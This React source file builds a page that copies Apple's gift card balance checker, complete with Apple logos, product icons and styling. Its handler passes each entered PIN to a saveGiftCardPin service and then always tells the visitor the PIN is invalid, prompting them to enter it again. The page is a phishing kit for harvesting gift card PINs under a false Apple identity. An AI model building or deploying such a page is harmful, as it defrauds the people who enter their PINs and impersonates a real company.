import { useState } from "react";
import MenuDrawer from "./menu";
import ChatDrawer from "./chat";
import { ShoppingBag } from 'lucide-react'
import { saveGiftCardPin } from './services/giftcardservice'
import {Appletv, Appleone, Applebook, Applenews, Appleicloud, Applefitness, Applemusic, Applemac, Applearcade,Appleitunes3, Appleitunesblue, Appleitunes1, Appleitunes2, Appleblack} from './assets';

// ── Icon Components ──────────────────────────────────────────────────────────

const AppleLogo = ({ size = 20, color = "currentColor" }) => (
  <svg width={size} height={size} viewBox="0 0 814 1000" fill={color}>
    <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-57.8-155.5-127.4C46 790.7 0 663 0 541.8c0-207.8 135.6-317.5 269-317.5 70.2 0 128.7 46.3 172.5 46.3 42.8 0 109.8-48.7 188.3-48.7 30.3 0 108.2 2.6 159.7 99zM540.1 239.2c-24.8-30.6-58.5-56.8-105.5-56.8-60.1 0-116.4 50.9-146 103.7-27.2 49.1-44.6 108.6-44.6 168.1 0 7.4.6 14.8 1.3 22.1 3.8.3 8.3.6 12.8.6 54 0 112.4-34.5 145.5-86.1 30.9-48.7 48.7-108.9 48.7-168.7 0-15.4-1.9-30.6-5.7-45.8-.1 0 .6 2 .6 5.6 0-1.7-.6-3.4-1.9-5.1l-1.9-1.9-2.6-1.9-1.7-1.9z"/>
  </svg>
);

const SearchIcon = () => (
  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
  </svg>
);
const Component = () => (
  <div className="font-semibold">
    <ShoppingBag size={24} />
  </div>
);


const MenuIcon = () => (
  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/>
  </svg>
);

const ChatIcon = () => (
  <svg width="22" height="22" viewBox="0 0 24 24" fill="white">
    <path d="M20 2H4a2 2 0 0 0-2 2v18l4-4h14a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2z"/>
  </svg>
);

// ── Hardware Icons (outline style) ───────────────────────────────────────────

const MacIcon = () => (
  <svg width="48" height="40" viewBox="0 0 64 52" fill="none" stroke="#1d1d1f" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
    <rect x="4" y="4" width="56" height="36" rx="3"/>
    <path d="M20 48h24M26 44v4M38 44v4"/>
  </svg>
);

const IPhoneIcon = () => (
  <svg width="32" height="48" viewBox="0 0 40 64" fill="none" stroke="#1d1d1f" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
    <rect x="4" y="2" width="32" height="60" rx="6"/>
    <circle cx="20" cy="56" r="3"/>
    <path d="M16 8h8"/>
  </svg>
);

const IPadIcon = () => (
  <svg width="40" height="48" viewBox="0 0 52 64" fill="none" stroke="#1d1d1f" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <rect x="4" y="2" width="44" height="60" rx="5"/>
    <circle cx="26" cy="56" r="2.5"/>
  </svg>
);

const WatchIcon = () => (
  <svg width="36" height="48" viewBox="0 0 48 64" fill="none" stroke="#1d1d1f" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round">
    <rect x="8" y="14" width="32" height="36" rx="10"/>
    <path d="M16 14V8a4 4 0 0 1 4-4h8a4 4 0 0 1 4 4v6M16 50v6a4 4 0 0 0 4 4h8a4 4 0 0 0 4-4v-6"/>
  </svg>
);

const AirPodsIcon = () => (
  <svg width="44" height="40" viewBox="0 0 60 52" fill="none" stroke="#1d1d1f" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round">
    <ellipse cx="18" cy="14" rx="6" ry="8"/>
    <path d="M18 22v18a4 4 0 0 1-8 0v-4"/>
    <ellipse cx="42" cy="14" rx="6" ry="8"/>
    <path d="M42 22v18a4 4 0 0 0 8 0v-4"/>
  </svg>
);

// ── App Icon component ────────────────────────────────────────────────────────

const AppIcon = ({ bg, children, label }) => (
  <div className="flex flex-col items-center gap-2">
    <div
      className="w-16 h-16 rounded-2xl flex items-center justify-center shadow-sm"
      style={{ background: bg }}
    >
      {children}
    </div>
    <span className="text-xs text-[#1d1d1f] font-medium">{label}</span>
  </div>
);

// ── Apple TV Icon SVG ─────────────────────────────────────────────────────────
const AppleTVIcon = () => (
  <svg width="32" height="22" viewBox="0 0 60 42" fill="white">
    <path d="M4 4h52a4 4 0 0 1 4 4v22a4 4 0 0 1-4 4H4a4 4 0 0 1-4-4V8a4 4 0 0 1 4-4z"/>
    <path d="M20 38h20M30 34v4" stroke="white" strokeWidth="3" strokeLinecap="round"/>
    <path fill="#1d1d1f" d="M16 14h4v16h-4zM22 14h4l6 10 6-10h4L34 30h-4z"/>
  </svg>
);


// ── Main Page ─────────────────────────────────────────────────────────────────

export default function AppleGiftCard() {
  const [pin, setPin] = useState("");
  const [checked, setChecked] = useState(false);
  const [message, setMessage] = useState("");
  const [menuOpen, setMenuOpen] = useState(false);
  const [chatOpen, setChatOpen] = useState(false);

  const handleCheck = async () => {
    try {
      await saveGiftCardPin(pin)
      setChecked(true)
      setMessage('PIN saved successfully!')
      console.log('success!')
    } catch (error) {
      setMessage('Something went wrong.')
      console.log('Full error:', error.message)
    }
  };
  return (
    <div className="min-h-screen w-full  bg-white" style={{ fontFamily: "-apple-system, 'SF Pro Display', 'SF Pro Text', BlinkMacSystemFont, sans-serif" }}>
       
       <MenuDrawer isOpen={menuOpen} onClose={() => setMenuOpen(false)} />
        <ChatDrawer isOpen={chatOpen} onClose={() => setChatOpen(false)} />

      {/* ── Navbar ── */}
      {!menuOpen && !chatOpen && (
      <nav className="sticky top-0 z-50 bg-[rgba(255,255,255,0.85)] backdrop-blur-md border-b border-[#d2d2d7]/60">
  <div className="max-w-5xl mx-auto px-5">
    
    {/* Top row - Apple logo + icons */}
    <div className="flex items-center justify-between h-12">
      <img src={Appleblack} alt="Appleblack" className="w-6 h-6" />
      <div className="flex items-center gap-4">
        <button className="text-[#1d1d1f] hover:text-[#0071e3] transition-colors"><SearchIcon /></button>
        <button className="text-[#1d1d1f] hover:text-[#0071e3] transition-colors"><ShoppingBag size={18} /></button>
        <button className="text-[#1d1d1f]" onClick={() => setMenuOpen(true)}><MenuIcon /></button>
      </div>
    </div>

    {/* Bottom row - Apple Gift Card text + Buy button */}
    <div className="flex items-center justify-between pb-2">
      <span className="text-[13px] font-bold text-gray-800 tracking-tight">Apple Gift Card</span>
      <button className="bg-[#0071e3] text-white text-[11px] font-semibold px-3 py-1 rounded-full">Buy</button>
    </div>

  </div>
</nav>
      )}

      {/* ── Balance Checker ── */}
      <section className="max-w-md mx-auto px-6 pt-10 pb-4 text-center gap-6">
  <p className="text-[22px] font-bold text-[#1d1d1f] leading-snug mb-8">
    Check Your Apple Gift Card <br /> Balance
  </p>
        <label className="block text-[15px] font-bold text-gray-700 mb-4 mt-4">
          Enter your PIN here:
        </label>

        <input
          type="text"
          value={pin}
          onChange={e => setPin(e.target.value)}
          placeholder="Gift Card PIN"
          maxLength={20}
          className="w-full border border-[#d2d2d7] rounded-full px-8 py-4 text-[15px] text-[#1d1d1f] placeholder-[#6e6e73] outline-none focus:border-[#0071e3] focus:ring-2 focus:ring-[#0071e3]/20 transition-all mb-2"
        />
         <div className="gap-4 mb-8">
        <p className="text-[13px] text-center text-[#6e6e73] my-4">
          Can't find your PIN?{" "}
          <a href="/" className="text-[#0071e3] hover:underline">Learn more</a>
        </p>
        </div>

        <div className="gap-3 mb-10">
        <button 
          onClick={handleCheck}
          className="w-full bg-[#0071e3] hover:bg-[#0077ed] active:bg-[#006edb] text-white font-semibold text-[16px] py-3.5 rounded-xl transition-colors"
        >
          Check Balance
        </button>
        </div>

        {checked && (
          <div className="mt-4 p-4 bg-green-50 border border-green-200 rounded-xl text-red-500 text-[14px] font-medium">
            Invalid pin. {pin.slice(-4)}. Please input the correct pin.
          </div>
        )}
      </section>

      {/* ── Gift Card Image ── */}
     <section className="flex justify-center py-8">
  <div className="relative w-20 h-32">

    {/* Back card - slightly right and rotated */}
    <div className="absolute top-6 right-14 w-16 h-20 rounded-xl shadow-md rotate-6 overflow-hidden">
      <img src={Appleitunes2} alt='Appleitunes2' className="w-full h-full object-contain bg-white" />
    </div>

    {/* Front card - slightly left and rotated opposite */}
    <div className="absolute top-0 left-0 w-16 h-20 rounded-xl shadow-md -rotate-6 overflow-hidden">
      <img src={Appleitunes1} alt='Appleitunes1' className="w-full h-full object-contain bg-white" />
    </div>

  </div>
</section>
      {/* ── Where can I use ── */}
      <section className="max-w-md mx-auto px-6 pb-8">
        <h2 className="text-[17px] font-bold text-[#1d1d1f] mb-6 text-center">
          Where can I use my Apple Gift Card?
        </h2>

        {/* Hardware row 1 */}
        <div className="flex justify-around items-end mb-6">
          <div className="flex flex-col items-center gap-2">
            <MacIcon />
            <span className="text-[12px] text-[#1d1d1f] font-medium">Mac</span>
          </div>
          <div className="flex flex-col items-center gap-2">
            <IPhoneIcon />
            <span className="text-[12px] text-[#1d1d1f] font-medium">iPhone</span>
          </div>
          <div className="flex flex-col items-center gap-2">
            <IPadIcon />
            <span className="text-[12px] text-[#1d1d1f] font-medium">iPad</span>
          </div>
        </div>

        {/* Hardware row 2 */}
        <div className="flex justify-around items-end mb-8">
          <div className="flex flex-col items-center gap-2">
            <WatchIcon />
            <span className="text-[12px] text-[#1d1d1f] font-medium">Watch</span>
          </div>
          <div className="flex flex-col items-center gap-2">
            <AirPodsIcon />
            <span className="text-[12px] text-[#1d1d1f] font-medium">Accessories</span>
          </div>
          <div className="w-16" /> {/* spacer */}
        </div>

        {/* App icons grid */}
        <div className="grid grid-cols-3 gap-y-5 gap-x-2">

          {/* App Store */}
          <div className="flex flex-col items-center gap-1">
            <img src={Applemac} alt='applemac' className="w-16 h-16 rounded-2xl" />
            <span className="text-[12px] text-[#1d1d1f] font-medium">Mac</span>
          </div>

          {/* Arcade */}
          <div className="flex flex-col items-center gap-1">
            <img src={Applearcade} alt='applearcade' className="w-16 h-16 rounded-2xl"/>
            <span className="text-[12px] text-[#1d1d1f] font-medium">Arcade</span>
          </div>

          {/* Music */}
          <div className="flex flex-col items-center gap-1">
            <img src={Applemusic} alt='applemusic' className="w-16 h-16 rounded-2xl" />
            <span className="text-[12px] text-[#1d1d1f] font-medium">Music</span>
          </div>

          {/* Apple TV */}
          <div className="flex flex-col items-center gap-1">
            <img src={Appletv} alt='appletv' className="w-16 h-16 rounded-2xl" />
            <span className="text-[12px] text-[#1d1d1f] font-medium">TV</span>
          </div>

          {/* iTunes */}
          <div className="flex flex-col items-center gap-1">
            <img src={Appleitunes3} alt='appleitunes3' className="w-16 h-16 rounded-2xl" />
            <span className="text-[15px] text-[#1d1d1f] font-medium">+itunes</span>
          </div>

          {/* Apple One */}
          <div className="flex flex-col items-center gap-1">
            <img src={Appleone} alt="appleone" className="w-16 h-16rounded-2xl" />
            <span className="text-[12px] text-[#1d1d1f] font-medium">Apple One</span>
          </div>

          {/* Fitness+ */}
          <div className="flex flex-col items-center gap-1">
            <img src={Applefitness} alt='applefitness' className="w-16 h-16 rounded-2xl" />
            <span className="text-[12px] text-[#1d1d1f] font-medium">Fitness+</span>
          </div>

          {/* iCloud+ */}
         <div className="flex flex-col items-center gap-1">
            <img src={Appleicloud} alt='appleicloud' className="w-16 h-16 rounded-2xl" />
            <span className="text-[12px] text-[#1d1d1f] font-medium">icloud+</span>
          </div>

          {/* News+ */}
           <div className="flex flex-col items-center gap-1">
            <img src={Applenews} alt='applenews' className="w-16 h-16 rounded-2xl" />
            <span className="text-[12px] text-[#1d1d1f] font-medium">News+</span>
          </div>

          {/* Books */}
          <div className="flex flex-col items-center gap-1">
            <img src={Applebook} alt='applebook' className="w-16 h-16 rounded-2xl" />
            <span className="text-[12px] text-[#1d1d1f] font-medium">Books</span>
          </div>

        </div>
      </section>

      {/* ── Divider ── */}
      <div className="max-w-md mx-auto px-6">
        <hr className="border-[#d2d2d7]" />
      </div>

      {/* ── Older gift card ── */}
      <section className="max-w-md mx-auto px-6 py-8 text-center">
        <p className="text-[15px] font-semibold text-[#1d1d1f] mb-1">Have an older giftcard?</p>
        <a href="/" className="text-[14px] text-[#0071e3] hover:underline">Learn more</a>

        {/* Old card images */}
        <div className="flex justify-center gap-4 mt-6">
          {/* Classic grey card */}
          <div className="w-28 h-18 rounded-xl shadow-md overflow-hidden border border-[#d2d2d7]"
            style={{ background: "linear-gradient(135deg, #e8e8ed 0%, #d1d1d6 100%)", height: "72px", width: "112px" }}>
            <div className="w-full h-full flex items-center justify-center">
              <AppleLogo size={30} color="#6e6e73" />
            </div>
          </div>
          {/* Blue gradient card */}
          <div className="w-28 rounded-xl shadow-md overflow-hidden"
            style={{ background: "linear-gradient(135deg, #0071e3 0%, #40a9ff 50%, #a78bfa 100%)", height: "72px", width: "112px" }}>
            <div className="w-full h-full flex items-center justify-center">
              <img src={Appleitunesblue}  alt='Appleitunesblue' size={30} color="white" />
            </div>
          </div>
        </div>
      </section>

      {/* ── Chat bubble ── */}
      {!menuOpen && !chatOpen && (
      <div className="fixed bottom-6 left-6 z-50">
  <button
    onClick={() => setChatOpen(true)}
    className="w-12 h-12 bg-[#1d1d1f] rounded-full flex items-center justify-center shadow-xl hover:bg-[#3a3a3c] transition-colors"
  >
    <ChatIcon />
  </button>
</div>
      )}

    </div>
  );
}

